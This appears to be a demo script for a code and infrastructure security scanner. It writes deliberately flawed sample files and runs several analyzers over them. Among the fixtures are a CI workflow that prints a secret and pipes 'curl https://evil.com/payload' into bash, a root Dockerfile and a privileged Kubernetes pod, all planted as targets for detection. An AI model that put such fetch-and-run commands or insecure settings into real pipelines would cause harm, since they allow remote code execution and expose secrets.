import { CombinedSemanticGraph } from '../src/index.js';
import { DeploySafe } from '../src/analysis/deploy-safe.js';
import { writeFileSync, mkdirSync, existsSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

async function main() {
  console.log('═══════════════════════════════════════════════════════════════');
  console.log('  CSG v2 — 10-Dimension Deep Analysis Demo');
  console.log('═══════════════════════════════════════════════════════════════\n');

  const testDir = join(tmpdir(), 'csg-v2-demo-' + Date.now());
  mkdirSync(testDir, { recursive: true });

  // --- Create test infrastructure files ---
  writeFileSync(join(testDir, 'Dockerfile'), `
FROM node:latest
RUN apt-get update
RUN apt-get install -y curl
USER root
COPY . /app
WORKDIR /app
RUN npm install --unsafe-perm
ENV NODE_ENV=development
EXPOSE 22
CMD ["node", "server.js"]
  `.trim());

  writeFileSync(join(testDir, 'deploy.yml'), [
    'name: Deploy',
    'on: [push]',
    'jobs:',
    '  deploy:',
    '    runs-on: self-hosted',
    '    steps:',
    '      - uses: actions/checkout@main',
    '      - run: echo "${{ secrets.API_KEY }}"',
    '      - run: curl https://evil.com/payload | bash',
    '',
  ].join('\n'));

  writeFileSync(join(testDir, 'deployment.yaml'), `
apiVersion: apps/v1
kind: Deployment
spec:
  replicas: 1
  template:
    spec:
      containers:
      - name: app
        image: myapp:latest
        securityContext:
          privileged: true
          runAsNonRoot: false
  `.trim());

  // --- Create test source files ---
  writeFileSync(join(testDir, 'server.ts'), `
import { createClient } from 'redis';
import Stripe from 'stripe';
import { logger, tracer } from './telemetry';

const redis = createClient();
const stripe = new Stripe('sk_test_xxx');

export async function processPayment(req: any, res: any) {
  try {
    const { amount, currency } = req.body;
    const payment = await stripe.paymentIntents.create({ amount, currency });
    res.json(payment);
  } catch (err) {
    console.log('something broke');  // empty catch — silent swallow
  }
}

export async function getUserData(id: string) {
  try {
    const data = await redis.get(\`user:\${id}\`);
    return JSON.parse(data || '{}');
  } catch (e) {}  // empty catch — swallows error
}

export async function fetchExternal(url: string) {
  const response = await fetch(url);
  return response.json();
}

export function complexNestedLogic(a: number, b: number, c: number) {
  if (a > 0) {
    if (b > 0) {
      if (c > 0) {
        for (let i = 0; i < a; i++) {
          for (let j = 0; j < b; j++) {
            if (i === j) continue;
            console.log(i, j);
          }
        }
      }
    }
  }
  return a + b + c;
}
  `.trim());

  writeFileSync(join(testDir, 'telemetry.ts'), `
export const logger = {
  info: (m: string) => console.log(m),
  error: (m: string) => console.error(m),
  warn: (m: string) => console.warn(m),
};
export const tracer = {
  startSpan: (name: string) => ({ end: () => {} }),
};
  `.trim());

  writeFileSync(join(testDir, 'db.ts'), `
import { logger } from './telemetry';

export async function queryDatabase(sql: string) {
  try {
    return await executeQuery(sql);
  } catch (err) {
    logger.error('DB query failed');
    throw err;
  }
}

function executeQuery(sql: string) {
  return Promise.resolve({ rows: [] });
}
  `.trim());

  // =========================================================
  // 1. DEPLOYSAFE — Infrastructure Verifier
  // =========================================================
  console.log('╔══════════════════════════════════════════════════════════════╗');
  console.log('║  1. DeploySafe — Infrastructure Security Verifier         ║');
  console.log('╚══════════════════════════════════════════════════════════════╝\n');

  const ds = new DeploySafe();
  ds.scanDirectory(testDir);
  const dsReport = ds.report();

  console.log(`  Overall Score: ${dsReport.score}/100`);
  console.log(`  Files Scanned: ${dsReport.filesScanned.length}`);
  console.log(`  Dockerfile Issues: ${dsReport.dockerfileIssues}`);
  console.log(`  CI/CD Issues: ${dsReport.cicdIssues}`);
  console.log(`  Secret Exposures: ${dsReport.secretExposures}`);
  for (const f of dsReport.findings) {
    console.log(`  [${f.ruleId}] ${f.severity.toUpperCase()} ${f.message} (${f.file}:${f.line})`);
    console.log(`    -> ${f.remediation}`);
  }

  // =========================================================
  // 2. FAILSAFE — Try/Catch & Resilience Patterns
  // =========================================================
  console.log('\n╔══════════════════════════════════════════════════════════════╗');
  console.log('║  2. FailSafe — Topology Checker                           ║');
  console.log('╚══════════════════════════════════════════════════════════════╝\n');

  const fsg = new CombinedSemanticGraph();
  const sourceFiles = ['server.ts', 'db.ts', 'telemetry.ts'];
  for (const sf of sourceFiles) {
    const p = join(testDir, sf);
    if (existsSync(p)) fsg.parseFile(p);
  }
  fsg.build();
  const fsReport = fsg.analyzeResilience();

  console.log(`  Score: ${fsReport.score}/100`);
  console.log(`  Try/Catch Blocks: ${fsReport.tryCatchBlocks.length}`);
  console.log(`  Empty Catches: ${fsReport.emptyCatchCount}`);
  console.log(`  Missing Logging: ${fsReport.missingLoggingCount}`);
  console.log(`  Missing Retry: ${fsReport.missingRetryCount}`);
  console.log(`  Missing Timeout: ${fsReport.missingTimeoutCount}`);
  for (const t of fsReport.tryCatchBlocks) {
    const flags: string[] = [];
    if (t.hasEmptyCatch) flags.push('EMPTY');
    if (!t.hasLoggedError) flags.push('NO_LOG');
    if (!t.hasRetry && t.surroundingApiCall) flags.push('NO_RETRY');
    if (!t.hasTimeout && t.surroundingApiCall) flags.push('NO_TIMEOUT');
    const status = flags.length > 0 ? `⚠️  [${flags.join(', ')}]` : '✅ OK';
    console.log(`  ${t.file}:${t.line} ${status} ${t.surroundingApiCall ? '(API: ' + t.surroundingApiCall + ')' : ''}`);
  }

  // =========================================================
  // 3. OBSCOVER — Observability Matrix
  // =========================================================
  console.log('\n╔══════════════════════════════════════════════════════════════╗');
  console.log('║  3. ObsCover — Telemetry Boundary Mapping                 ║');
  console.log('╚══════════════════════════════════════════════════════════════╝\n');

  const obsReport = fsg.analyzeObservability();
  console.log(`  Debt Score: ${obsReport.observabilityDebtScore}/100`);
  console.log(`  Coverage: ${obsReport.coveragePct}%`);
  console.log(`  Total Blocks: ${obsReport.totalBlocks} | Covered: ${obsReport.coveredBlocks} | Partial: ${obsReport.partialBlocks} | Uncovered: ${obsReport.uncoveredBlocks}`);
  for (const b of obsReport.boundaries) {
    const icon = b.coverage === 'covered' ? '✅' : b.coverage === 'partial' ? '⚠️' : '❌';
    console.log(`  ${icon} ${b.file}:${b.line} [${b.blockType}] logging=${b.hasLogging} tracing=${b.hasTracing}`);
  }
  for (const a of obsReport.recommendedActions) console.log(`  → ${a}`);

  // =========================================================
  // 4. COGFLOW — Cognitive Load Profiler
  // =========================================================
  console.log('\n╔══════════════════════════════════════════════════════════════╗');
  console.log('║  4. CogFlow — Cognitive Complexity Analysis               ║');
  console.log('╚══════════════════════════════════════════════════════════════╝\n');

  const cogReport = fsg.analyzeCognitiveLoad();
  console.log(`  Score: ${cogReport.score}/100`);
  console.log(`  Max Complexity: ${cogReport.maxComplexity}`);
  console.log(`  Avg Complexity: ${cogReport.avgComplexity}`);
  console.log(`  High/Extreme Functions: ${cogReport.totalHighComplexity}`);
  for (const f of cogReport.functions) {
    const icon = f.category === 'extreme' ? '🔥' : f.category === 'high' ? '⚠️' : f.category === 'moderate' ? '⚡' : '✅';
    console.log(`  ${icon} ${f.functionName}() — ${f.complexity} pts [${f.category}] — ${f.file}:${f.line}`);
    console.log(`     nesting=${f.breakdown.nesting} loops=${f.breakdown.loops} conditionals=${f.breakdown.conditionals} recursion=${f.breakdown.recursion} logicalOps=${f.breakdown.logicalOps}`);
  }

  // =========================================================
  // 5. ARCHSCAN — Architectural Smell Detection
  // =========================================================
  console.log('\n╔══════════════════════════════════════════════════════════════╗');
  console.log('║  5. ArchScan — Martin\'s Metrics & Circular Deps           ║');
  console.log('╚══════════════════════════════════════════════════════════════╝\n');

  const archReport = fsg.analyzeArchitecture();
  console.log(`  Score: ${archReport.score}/100`);
  console.log(`  Instability Trend: ${archReport.instabilityTrend}`);
  console.log(`  Circular Dependencies: ${archReport.circularDependencies.length}`);
  console.log(`  Hotspots (I>0.7 or D>0.5): ${archReport.hotSpots.length}`);
  for (const c of archReport.circularDependencies) {
    console.log(`  🔄 ${c.cycle.join(' → ')} (${c.length} files)`);
  }
  for (const m of archReport.moduleMetrics) {
    const flag = m.instability > 0.7 || m.distance > 0.5 ? '⚠️' : '✅';
    console.log(`  ${flag} ${m.file.split('/').pop()} Ce=${m.efferentCoupling} Ca=${m.afferentCoupling} I=${m.instability.toFixed(3)} D=${m.distance.toFixed(3)}`);
  }

  // =========================================================
  // 6. TIME-AWARE DEPS (skipped in offline demo, mock data)
  // =========================================================
  console.log('\n╔══════════════════════════════════════════════════════════════╗');
  console.log('║  6. Time-Aware Dependency Calculus (mock)                 ║');
  console.log('╚══════════════════════════════════════════════════════════════╝\n');

  console.log('  (Skipped — requires network access to npm registry)');
  console.log('  Run "csg deps --package-json ./package.json" to analyze real dependencies');

  // =========================================================
  // SUMMARY
  // =========================================================
  console.log('\n═══════════════════════════════════════════════════════════════');
  console.log('  REPORT CARD');
  console.log('═══════════════════════════════════════════════════════════════\n');
  console.log(`  DeploySafe:      ${dsReport.score}/100  (${dsReport.findings.length} findings)`);
  console.log(`  FailSafe:        ${fsReport.score}/100  (${fsReport.tryCatchBlocks.length} try/catch blocks)`);
  console.log(`  ObsCover:        ${obsReport.observabilityDebtScore}/100 debt  (${obsReport.coveragePct}% coverage)`);
  console.log(`  CogFlow:         ${cogReport.score}/100  (${cogReport.totalHighComplexity} high-complexity functions)`);
  console.log(`  ArchScan:        ${archReport.score}/100  (${archReport.circularDependencies.length} cycles, ${archReport.hotSpots.length} hotspots)`);
  const overall = Math.round((dsReport.score + fsReport.score + (100 - obsReport.observabilityDebtScore) + cogReport.score + archReport.score) / 5);
  console.log(`\n  OVERALL: ${overall}/100`);
  console.log('\n═══════════════════════════════════════════════════════════════\n');

  // Cleanup temp files
  const { rmSync } = await import('node:fs');
  rmSync(testDir, { recursive: true, force: true });
}

main().catch(console.error);
